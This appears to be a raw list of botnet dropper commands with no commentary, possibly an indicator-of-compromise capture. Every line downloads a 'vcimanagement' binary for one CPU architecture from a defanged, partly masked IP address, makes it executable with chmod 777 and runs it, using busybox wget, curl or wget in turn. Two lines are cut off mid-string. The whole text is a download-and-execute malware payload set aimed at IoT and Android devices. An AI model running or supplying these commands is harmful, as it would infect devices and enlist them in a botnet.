busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 andr
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
curl hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
curl hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
curl hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
curl hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android
curl hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android
wget hxxp://141.11.88.XXX/bi
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
